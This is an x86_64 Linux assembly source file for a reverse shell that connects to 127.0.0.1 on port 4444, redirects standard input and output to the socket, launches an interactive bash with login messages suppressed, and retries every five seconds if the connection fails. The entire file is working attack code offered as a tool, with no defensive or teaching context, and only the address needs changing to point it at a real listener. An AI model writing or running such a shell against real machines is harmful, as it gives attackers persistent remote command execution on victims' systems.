; reverse_shell_nopty.asm
; NASM x86_64 Linux reverse shell WITHOUT root requirement
; Simple dup2 socket → stdin/out/err, custom PS1 prompt, suppress MOTD

section .data
    ; sockaddr_in struct: AF_INET, port 4444, IP 127.0.0.1
    socket_addr:
        dw 2                 ; AF_INET
        dw 0x5c11            ; port 4444 (little endian)
        dd 0x0100007f        ; IP 127.0.0.1
        dq 0                 ; padding

    ; nanosleep timespec {5, 0}
    ts:
        dq 5
        dq 0

    ; Strings for execve
    bash_path: db "/bin/bash",0
    arg_i:     db "-i",0
    argv:      dq bash_path, arg_i, 0
    ; Environment: custom PS1 and suppress message of the day
    ps1_str:   db "PS1=\u@\h:\w$ ",0
    hush:      db "HUSHLOGIN=TRUE",0
    envp:      dq ps1_str, hush, 0

section .text
    global _start
_start:
.connexion:
    ; syscall socket(AF_INET, SOCK_STREAM, 0)
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    cmp     rax, 0
    jl      .attente
    mov     r12, rax         ; sockfd

    ; syscall connect(sockfd, &socket_addr, 16)
    mov     rdi, r12
    lea     rsi, [rel socket_addr]
    mov     rdx, 16
    mov     rax, 42
    syscall
    cmp     rax, 0
    jl      .attente

    ; dup2(sockfd, 0..2)
    mov     rdi, r12
    xor     rsi, rsi
.dup2_loop:
    mov     rax, 33          ; dup2
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     .dup2_loop

    ; execve("/bin/bash", ["/bin/bash","-i",NULL], ["PS1=...","HUSHLOGIN=TRUE",NULL])
    lea     rdi, [rel bash_path]
    lea     rsi, [rel argv]
    lea     rdx, [rel envp]
    mov     rax, 59          ; execve
    syscall

.erreur:
    ; exit(1)
    mov     rax, 60
    mov     rdi, 1
    syscall

.attente:
    ; nanosleep(&ts)
    mov     rax, 35
    lea     rdi, [rel ts]
    xor     rsi, rsi
    syscall
    jmp     .connexion
